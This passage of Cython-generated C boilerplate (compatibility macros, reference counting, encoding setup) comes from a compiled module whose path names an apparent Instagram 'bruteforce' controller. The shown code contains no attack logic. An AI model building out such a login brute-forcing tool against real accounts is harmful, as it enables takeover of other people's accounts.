#endif
#if PY_MAJOR_VERSION >= 3
  #define PyIntObject                  PyLongObject
  #define PyInt_Type                   PyLong_Type
  #define PyInt_Check(op)              PyLong_Check(op)
  #define PyInt_CheckExact(op)         PyLong_CheckExact(op)
  #define PyInt_FromString             PyLong_FromString
  #define PyInt_FromUnicode            PyLong_FromUnicode
  #define PyInt_FromLong               PyLong_FromLong
  #define PyInt_FromSize_t             PyLong_FromSize_t
  #define PyInt_FromSsize_t            PyLong_FromSsize_t
  #define PyInt_AsLong                 PyLong_AsLong
  #define PyInt_AS_LONG                PyLong_AS_LONG
  #define PyInt_AsSsize_t              PyLong_AsSsize_t
  #define PyInt_AsUnsignedLongMask     PyLong_AsUnsignedLongMask
  #define PyInt_AsUnsignedLongLongMask PyLong_AsUnsignedLongLongMask
  #define PyNumber_Int                 PyNumber_Long
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBoolObject                 PyLongObject
#endif
#if PY_MAJOR_VERSION >= 3 && CYTHON_COMPILING_IN_PYPY
  #ifndef PyUnicode_InternFromString
    #define PyUnicode_InternFromString(s) PyUnicode_FromString(s)
  #endif
#endif
#if PY_VERSION_HEX < 0x030200A4
  typedef long Py_hash_t;
  #define __Pyx_PyInt_FromHash_t PyInt_FromLong
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsHash_t
#else
  #define __Pyx_PyInt_FromHash_t PyInt_FromSsize_t
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsSsize_t
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyMethod_New(func, self, klass) ((self) ? ((void)(klass), PyMethod_New(func, self)) : __Pyx_NewRef(func))
#else
  #define __Pyx_PyMethod_New(func, self, klass) PyMethod_New(func, self, klass)
#endif
#if CYTHON_USE_ASYNC_SLOTS
  #if PY_VERSION_HEX >= 0x030500B1
    #define __Pyx_PyAsyncMethodsStruct PyAsyncMethods
    #define __Pyx_PyType_AsAsync(obj) (Py_TYPE(obj)->tp_as_async)
  #else
    #define __Pyx_PyType_AsAsync(obj) ((__Pyx_PyAsyncMethodsStruct*) (Py_TYPE(obj)->tp_reserved))
  #endif
#else
  #define __Pyx_PyType_AsAsync(obj) NULL
#endif
#ifndef __Pyx_PyAsyncMethodsStruct
    typedef struct {
        unaryfunc am_await;
        unaryfunc am_aiter;
        unaryfunc am_anext;
    } __Pyx_PyAsyncMethodsStruct;
#endif

#if defined(_WIN32) || defined(WIN32) || defined(MS_WINDOWS)
  #if !defined(_USE_MATH_DEFINES)
    #define _USE_MATH_DEFINES
  #endif
#endif
#include <math.h>
#ifdef NAN
#define __PYX_NAN() ((float) NAN)
#else
static CYTHON_INLINE float __PYX_NAN() {
  float value;
  memset(&value, 0xFF, sizeof(value));
  return value;
}
#endif
#if defined(__CYGWIN__) && defined(_LDBL_EQ_DBL)
#define __Pyx_truncl trunc
#else
#define __Pyx_truncl truncl
#endif

#define __PYX_MARK_ERR_POS(f_index, lineno) \
    { __pyx_filename = __pyx_f[f_index]; (void)__pyx_filename; __pyx_lineno = lineno; (void)__pyx_lineno; __pyx_clineno = __LINE__; (void)__pyx_clineno; }
#define __PYX_ERR(f_index, lineno, Ln_error) \
    { __PYX_MARK_ERR_POS(f_index, lineno) goto Ln_error; }

#ifndef __PYX_EXTERN_C
  #ifdef __cplusplus
    #define __PYX_EXTERN_C extern "C"
  #else
    #define __PYX_EXTERN_C extern
  #endif
#endif

#define __PYX_HAVE__controllers__ig__bruteforce____init__
#define __PYX_HAVE_API__controllers__ig__bruteforce____init__
 
#ifdef _OPENMP
#include <omp.h>
#endif  

#if defined(PYREX_WITHOUT_ASSERTIONS) && !defined(CYTHON_WITHOUT_ASSERTIONS)
#define CYTHON_WITHOUT_ASSERTIONS
#endif

typedef struct {PyObject **p; const char *s; const Py_ssize_t n; const char* encoding;
                const char is_unicode; const char is_str; const char intern; } __Pyx_StringTabEntry;

#define __PYX_DEFAULT_STRING_ENCODING_IS_ASCII 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_UTF8 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT (PY_MAJOR_VERSION >= 3 && __PYX_DEFAULT_STRING_ENCODING_IS_UTF8)
#define __PYX_DEFAULT_STRING_ENCODING ""
#define __Pyx_PyObject_FromString __Pyx_PyBytes_FromString
#define __Pyx_PyObject_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#define __Pyx_uchar_cast(c) ((unsigned char)c)
#define __Pyx_long_cast(x) ((long)x)
#define __Pyx_fits_Py_ssize_t(v, type, is_signed)  (\
    (sizeof(type) < sizeof(Py_ssize_t))  ||\
    (sizeof(type) > sizeof(Py_ssize_t) &&\
          likely(v < (type)PY_SSIZE_T_MAX ||\
                 v == (type)PY_SSIZE_T_MAX)  &&\
          (!is_signed || likely(v > (type)PY_SSIZE_T_MIN ||\
                                v == (type)PY_SSIZE_T_MIN)))  ||\
    (sizeof(type) == sizeof(Py_ssize_t) &&\
          (is_signed || likely(v < (type)PY_SSIZE_T_MAX ||\
                               v == (type)PY_SSIZE_T_MAX)))  )
static CYTHON_INLINE int __Pyx_is_valid_index(Py_ssize_t i, Py_ssize_t limit) {
    return (size_t) i < (size_t) limit;
}
#if defined (__cplusplus) && __cplusplus >= 201103L
    #include <cstdlib>
    #define __Pyx_sst_abs(value) std::abs(value)
#elif SIZEOF_INT >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) abs(value)
#elif SIZEOF_LONG >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) labs(value)
#elif defined (_MSC_VER)
    #define __Pyx_sst_abs(value) ((Py_ssize_t)_abs64(value))
#elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define __Pyx_sst_abs(value) llabs(value)
#elif defined (__GNUC__)
    #define __Pyx_sst_abs(value) __builtin_llabs(value)
#else
    #define __Pyx_sst_abs(value) ((value<0) ? -value : value)
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject*);
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject*, Py_ssize_t* length);
#define __Pyx_PyByteArray_FromString(s) PyByteArray_FromStringAndSize((const char*)s, strlen((const char*)s))
#define __Pyx_PyByteArray_FromStringAndSize(s, l) PyByteArray_FromStringAndSize((const char*)s, l)
#define __Pyx_PyBytes_FromString        PyBytes_FromString
#define __Pyx_PyBytes_FromStringAndSize PyBytes_FromStringAndSize
static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char*);
#if PY_MAJOR_VERSION < 3
    #define __Pyx_PyStr_FromString        __Pyx_PyBytes_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#else
    #define __Pyx_PyStr_FromString        __Pyx_PyUnicode_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyUnicode_FromStringAndSize
#endif
#define __Pyx_PyBytes_AsWritableString(s)     ((char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableSString(s)    ((signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableUString(s)    ((unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsString(s)     ((const char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsSString(s)    ((const signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsUString(s)    ((const unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyObject_AsWritableString(s)    ((char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableSString(s)    ((signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableUString(s)    ((unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsSString(s)    ((const signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsUString(s)    ((const unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_FromCString(s)  __Pyx_PyObject_FromString((const char*)s)
#define __Pyx_PyBytes_FromCString(s)   __Pyx_PyBytes_FromString((const char*)s)
#define __Pyx_PyByteArray_FromCString(s)   __Pyx_PyByteArray_FromString((const char*)s)
#define __Pyx_PyStr_FromCString(s)     __Pyx_PyStr_FromString((const char*)s)
#define __Pyx_PyUnicode_FromCString(s) __Pyx_PyUnicode_FromString((const char*)s)
static CYTHON_INLINE size_t __Pyx_Py_UNICODE_strlen(const Py_UNICODE *u) {
    const Py_UNICODE *u_end = u;
    while (*u_end++) ;
    return (size_t)(u_end - u - 1);
}
#define __Pyx_PyUnicode_FromUnicode(u)       PyUnicode_FromUnicode(u, __Pyx_Py_UNICODE_strlen(u))
#define __Pyx_PyUnicode_FromUnicodeAndLength PyUnicode_FromUnicode
#define __Pyx_PyUnicode_AsUnicode            PyUnicode_AsUnicode
#define __Pyx_NewRef(obj) (Py_INCREF(obj), obj)
#define __Pyx_Owned_Py_None(b) __Pyx_NewRef(Py_None)
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b);
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject*);
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject*);
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x);
#define __Pyx_PySequence_Tuple(obj)\
    (likely(PyTuple_CheckExact(obj)) ? __Pyx_NewRef(obj) : PySequence_Tuple(obj))
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject*);
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t);
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject*);
#if CYTHON_ASSUME_SAFE_MACROS
#define __pyx_PyFloat_AsDouble(x) (PyFloat_CheckExact(x) ? PyFloat_AS_DOUBLE(x) : PyFloat_AsDouble(x))
#else
#define __pyx_PyFloat_AsDouble(x) PyFloat_AsDouble(x)
#endif
#define __pyx_PyFloat_AsFloat(x) ((float) __pyx_PyFloat_AsDouble(x))
#if PY_MAJOR_VERSION >= 3
#define __Pyx_PyNumber_Int(x) (PyLong_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Long(x))
#else
#define __Pyx_PyNumber_Int(x) (PyInt_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Int(x))
#endif
#define __Pyx_PyNumber_Float(x) (PyFloat_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Float(x))
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
static int __Pyx_sys_getdefaultencoding_not_ascii;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    PyObject* ascii_chars_u = NULL;
    PyObject* ascii_chars_b = NULL;
    const char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    if (strcmp(default_encoding_c, "ascii") == 0) {
        __Pyx_sys_getdefaultencoding_not_ascii = 0;
    } else {
        char ascii_chars[128];
        int c;
        for (c = 0; c < 128; c++) {
            ascii_chars[c] = c;
        }
        __Pyx_sys_getdefaultencoding_not_ascii = 1;
        ascii_chars_u = PyUnicode_DecodeASCII(ascii_chars, 128, NULL);
        if (!ascii_chars_u) goto bad;
        ascii_chars_b = PyUnicode_AsEncodedString(ascii_chars_u, default_encoding_c, NULL);
        if (!ascii_chars_b || !PyBytes_Check(ascii_chars_b) || memcmp(ascii_chars, PyBytes_AS_STRING(ascii_chars_b), 128) != 0) {
            PyErr_Format(
                PyExc_ValueError,
                "This module compiled with c_string_encoding=ascii, but default encoding '%.200s' is not a superset of ascii.",
                default_encoding_c);
            goto bad;
        }
        Py_DECREF(ascii_chars_u);
        Py_DECREF(ascii_chars_b);
    }
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    Py_XDECREF(ascii_chars_u);
    Py_XDECREF(ascii_chars_b);
    return -1;
}
#endif
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT && PY_MAJOR_VERSION >= 3
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_DecodeUTF8(c_str, size, NULL)
#else
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_Decode(c_str, size, __PYX_DEFAULT_STRING_ENCODING, NULL)
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
static char* __PYX_DEFAULT_STRING_ENCODING;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) (const char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    __PYX_DEFAULT_STRING_ENCODING = (char*) malloc(strlen(default_encoding_c) + 1);
    if (!__PYX_DEFAULT_STRING_ENCODING) goto bad;
    strcpy(__PYX_DEFAULT_STRING_ENCODING, default_encoding_c);
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    return -1;
}
#endif
#endif


 
#if defined(__GNUC__)     && (__GNUC__ > 2 || (__GNUC__ == 2 && (__GNUC_MINOR__ > 95)))
  #define likely(x)   __builtin_expect(!!(x), 1)
  #define unlikely(x) __builtin_expect(!!(x), 0)
#else  
  #define likely(x)   (x)
  #define unlikely(x) (x)
#endif  
static CYTHON_INLINE void __Pyx_pretend_to_initialize(void* ptr) { (void)ptr; }

static PyObject *__pyx_m = NULL;
static PyObject *__pyx_d;
static PyObject *__pyx_b;
static PyObject *__pyx_cython_runtime = NULL;
static PyObject *__pyx_empty_tuple;
static PyObject *__pyx_empty_bytes;
static PyObject *__pyx_empty_unicode;
static int __pyx_lineno;
static int __pyx_clineno = 0;
static const char * __pyx_cfilenm= __FILE__;
static const char *__pyx_filename;


static const char *__pyx_f[] = {
  "mtf/app/controllers/ig/bruteforce/__init__.py",
};

 
struct __pyx_obj_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start;
struct __pyx_defaults;
typedef struct __pyx_defaults __pyx_defaults;
struct __pyx_defaults {
  PyObject *__pyx_arg_user_agent;
};

 
struct __pyx_obj_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start {
  PyObject_HEAD
  PyObject *__pyx_v_self;
};


 
 
#ifndef CYTHON_REFNANNY
  #define CYTHON_REFNANNY 0
#endif
#if CYTHON_REFNANNY
  typedef struct {
    void (*INCREF)(void*, PyObject*, int);
    void (*DECREF)(void*, PyObject*, int);
    void (*GOTREF)(void*, PyObject*, int);
    void (*GIVEREF)(void*, PyObject*, int);
    void* (*SetupContext)(const char*, int, const char*);
    void (*FinishContext)(void**);
  } __Pyx_RefNannyAPIStruct;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNanny = NULL;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname);
  #define __Pyx_RefNannyDeclarations void *__pyx_refnanny = NULL;
#ifdef WITH_THREAD
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          if (acquire_gil) {\
              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
              PyGILState_Release(__pyx_gilstate_save);\
          } else {\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
          }
#else
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__)
#endif
  #define __Pyx_RefNannyFinishContext()\
          __Pyx_RefNanny->FinishContext(&__pyx_refnanny)
  #define __Pyx_INCREF(r)  __Pyx_RefNanny->INCREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_DECREF(r)  __Pyx_RefNanny->DECREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GOTREF(r)  __Pyx_RefNanny->GOTREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GIVEREF(r) __Pyx_RefNanny->GIVEREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_XINCREF(r)  do { if((r) != NULL) {__Pyx_INCREF(r); }} while(0)
  #define __Pyx_XDECREF(r)  do { if((r) != NULL) {__Pyx_DECREF(r); }} while(0)
  #define __Pyx_XGOTREF(r)  do { if((r) != NULL) {__Pyx_GOTREF(r); }} while(0)
  #define __Pyx_XGIVEREF(r) do { if((r) != NULL) {__Pyx_GIVEREF(r);}} while(0)
#else
  #define __Pyx_RefNannyDeclarations
  #define __Pyx_RefNannySetupContext(name, acquire_gil)
  #define __Pyx_RefNannyFinishContext()
  #define __Pyx_INCREF(r) Py_INCREF(r)
  #define __Pyx_DECREF(r) Py_DECREF(r)
  #define __Pyx_GOTREF(r)
  #define __Pyx_GIVEREF(r)
  #define __Pyx_XINCREF(r) Py_XINCREF(r)
  #define __Pyx_XDECREF(r) Py_XDECREF(r)
  #define __Pyx_XGOTREF(r)
  #define __Pyx_XGIVEREF(r)
#endif
#define __Pyx_XDECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_XDECREF(tmp);\
    } while (0)
#define __Pyx_DECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_DECREF(tmp);\
    } while (0)
#define __Pyx_CLEAR(r)    do { PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);} while(0)
#define __Pyx_XCLEAR(r)   do { if((r) != NULL) {PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);}} while(0)

 
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name);
#else
#define __Pyx_PyObject_GetAttrStr(o,n) PyObject_GetAttr(o,n)
#endif

 
static PyObject *__Pyx_GetBuiltinName(PyObject *name);

 
#if CYTHON_USE_TYPE_SLOTS
#define __Pyx_PyObject_DelAttrStr(o,n) __Pyx_PyObject_SetAttrStr(o, n, NULL)
static CYTHON_INLINE int __Pyx_PyObject_SetAttrStr(PyObject* obj, PyObject* attr_name, PyObject* value);
#else
#define __Pyx_PyObject_DelAttrStr(o,n)   PyObject_DelAttr(o,n)
#define __Pyx_PyObject_SetAttrStr(o,n,v) PyObject_SetAttr(o,n,v)
#endif

 
static void __Pyx_RaiseArgtupleInvalid(const char* func_name, int exact,
    Py_ssize_t num_min, Py_ssize_t num_max, Py_ssize_t num_found);

 
static void __Pyx_RaiseDoubleKeywordsError(const char* func_name, PyObject* kw_name);

 
static int __Pyx_ParseOptionalKeywords(PyObject *kwds, PyObject **argnames[],\
    PyObject *kwds2, PyObject *values[], Py_ssize_t num_pos_args,\
    const char* function_name);

 
#if CYTHON_FAST_PYCALL
#define __Pyx_PyFunction_FastCall(func, args, nargs)\
    __Pyx_PyFunction_FastCallDict((func), (args), (nargs), NULL)
#if 1 || PY_VERSION_HEX < 0x030600B1
static PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs);
#else
#define __Pyx_PyFunction_FastCallDict(func, args, nargs, kwargs) _PyFunction_FastCallDict(func, args, nargs, kwargs)
#endif
#define __Pyx_BUILD_ASSERT_EXPR(cond)\
    (sizeof(char [1 - 2*!(cond)]) - 1)
#ifndef Py_MEMBER_SIZE
#define Py_MEMBER_SIZE(type, member) sizeof(((type *)0)->member)
#endif
#if CYTHON_FAST_PYCALL
  static size_t __pyx_pyframe_localsplus_offset = 0;
  #include "frameobject.h"
#if PY_VERSION_HEX >= 0x030b00a6
  #ifndef Py_BUILD_CORE
    #define Py_BUILD_CORE 1
  #endif
  #include "internal/pycore_frame.h"
#endif
  #define __Pxy_PyFrame_Initialize_Offsets()\
    ((void)__Pyx_BUILD_ASSERT_EXPR(sizeof(PyFrameObject) == offsetof(PyFrameObject, f_localsplus) + Py_MEMBER_SIZE(PyFrameObject, f_localsplus)),\
     (void)(__pyx_pyframe_localsplus_offset = ((size_t)PyFrame_Type.tp_basicsize) - Py_MEMBER_SIZE(PyFrameObject, f_localsplus)))
  #define __Pyx_PyFrame_GetLocalsplus(frame)\
    (assert(__pyx_pyframe_localsplus_offset), (PyObject **)(((char *)(frame)) + __pyx_pyframe_localsplus_offset))
#endif  
#endif

 
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw);
#else
#define __Pyx_PyObject_Call(func, arg, kw) PyObject_Call(func, arg, kw)
#endif

 
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg);
#endif

 
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallNoArg(PyObject *func);
#else
#define __Pyx_PyObject_CallNoArg(func) __Pyx_PyObject_Call(func, __pyx_empty_tuple, NULL)
#endif

 
#if CYTHON_FAST_PYCCALL
static CYTHON_INLINE PyObject *__Pyx_PyCFunction_FastCall(PyObject *func, PyObject **args, Py_ssize_t nargs);
#else
#define __Pyx_PyCFunction_FastCall(func, args, nargs)  (assert(0), NULL)
#endif

 
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg);

 
static CYTHON_INLINE void __Pyx_RaiseClosureNameError(const char *varname);

 
static CYTHON_INLINE PyObject* __Pyx_PyObject_FormatSimpleAndDecref(PyObject* s, PyObject* f);
static CYTHON_INLINE PyObject* __Pyx_PyObject_FormatAndDecref(PyObject* s, PyObject* f);

 
#if defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 6))
#define __Pyx_HAS_GCC_DIAGNOSTIC
#endif

 
static PyObject* __Pyx_PyUnicode_BuildFromAscii(Py_ssize_t ulength, char* chars, int clength,
                                                int prepend_sign, char padding_char);

 
#include <string.h>

 
static CYTHON_INLINE PyObject* __Pyx_PyUnicode_From_Py_ssize_t(Py_ssize_t value, Py_ssize_t width, char padding_char, char format_char);

 
static PyObject* __Pyx_PyUnicode_Join(PyObject* value_tuple, Py_ssize_t value_count, Py_ssize_t result_ulength,
                                      Py_UCS4 max_char);

 
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
#define __PYX_DICT_VERSION_INIT  ((PY_UINT64_T) -1)
#define __PYX_GET_DICT_VERSION(dict)  (((PyDictObject*)(dict))->ma_version_tag)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\
    (version_var) = __PYX_GET_DICT_VERSION(dict);\
    (cache_var) = (value);
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP) {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    if (likely(__PYX_GET_DICT_VERSION(DICT) == __pyx_dict_version)) {\
        (VAR) = __pyx_dict_cached_value;\
    } else {\
        (VAR) = __pyx_dict_cached_value = (LOOKUP);\
        __pyx_dict_version = __PYX_GET_DICT_VERSION(DICT);\
    }\
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj);
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj);
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version);
#else
#define __PYX_GET_DICT_VERSION(dict)  (0)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP)  (VAR) = (LOOKUP);
#endif

 
#if CYTHON_USE_DICT_VERSIONS
#define __Pyx_GetModuleGlobalName(var, name)  do {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    (var) = (likely(__pyx_dict_version == __PYX_GET_DICT_VERSION(__pyx_d))) ?\
        (likely(__pyx_dict_cached_value) ? __Pyx_NewRef(__pyx_dict_cached_value) : __Pyx_GetBuiltinName(name)) :\
        __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
} while(0)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  do {\
    PY_UINT64_T __pyx_dict_version;\
    PyObject *__pyx_dict_cached_value;\
    (var) = __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
} while(0)
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value);
#else
#define __Pyx_GetModuleGlobalName(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name);
#endif

 
#if CYTHON_USE_PYTYPE_LOOKUP && CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_LookupSpecial(PyObject* obj, PyObject* attr_name) {
    PyObject *res;
    PyTypeObject *tp = Py_TYPE(obj);
#if PY_MAJOR_VERSION < 3
    if (unlikely(PyInstance_Check(obj)))
        return __Pyx_PyObject_GetAttrStr(obj, attr_name);
#endif
    res = _PyType_Lookup(tp, attr_name);
    if (likely(res)) {
        descrgetfunc f = Py_TYPE(res)->tp_descr_get;
        if (!f) {
            Py_INCREF(res);
        } else {
            res = f(res, obj, (PyObject *)tp);
        }
    } else {
        PyErr_SetObject(PyExc_AttributeError, attr_name);
    }
    return res;
}
#else
#define __Pyx_PyObject_LookupSpecial(o,n) __Pyx_PyObject_GetAttrStr(o,n)
#endif

 
#if CYTHON_USE_EXC_INFO_STACK
static _PyErr_StackItem * __Pyx_PyErr_GetTopmostException(PyThreadState *tstate);
#endif

 
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyThreadState_declare  PyThreadState *__pyx_tstate;
#define __Pyx_PyThreadState_assign  __pyx_tstate = __Pyx_PyThreadState_Current;
#define __Pyx_PyErr_Occurred()  __pyx_tstate->curexc_type
#else
#define __Pyx_PyThreadState_declare
#define __Pyx_PyThreadState_assign
#define __Pyx_PyErr_Occurred()  PyErr_Occurred()
#endif

 
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_ExceptionSave(type, value, tb)  __Pyx__ExceptionSave(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#define __Pyx_ExceptionReset(type, value, tb)  __Pyx__ExceptionReset(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);
#else
#define __Pyx_ExceptionSave(type, value, tb)   PyErr_GetExcInfo(type, value, tb)
#define __Pyx_ExceptionReset(type, value, tb)  PyErr_SetExcInfo(type, value, tb)
#endif

 
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_GetException(type, value, tb)  __Pyx__GetException(__pyx_tstate, type, value, tb)
static int __Pyx__GetException(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#else
static int __Pyx_GetException(PyObject **type, PyObject **value, PyObject **tb);
#endif

 
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyErr_Clear() __Pyx_ErrRestore(NULL, NULL, NULL)
#define __Pyx_ErrRestoreWithState(type, value, tb)  __Pyx_ErrRestoreInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)    __Pyx_ErrFetchInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  __Pyx_ErrRestoreInState(__pyx_tstate, type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)    __Pyx_ErrFetchInState(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_PyErr_SetNone(exc) (Py_INCREF(exc), __Pyx_ErrRestore((exc), NULL, NULL))
#else
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#endif
#else
#define __Pyx_PyErr_Clear() PyErr_Clear()
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#define __Pyx_ErrRestoreWithState(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestoreInState(tstate, type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchInState(tstate, type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)  PyErr_Fetch(type, value, tb)
#endif

 
#if PY_MAJOR_VERSION >= 3 && !CYTHON_COMPILING_IN_PYPY
static PyObject *__Pyx_PyDict_GetItem(PyObject *d, PyObject* key);
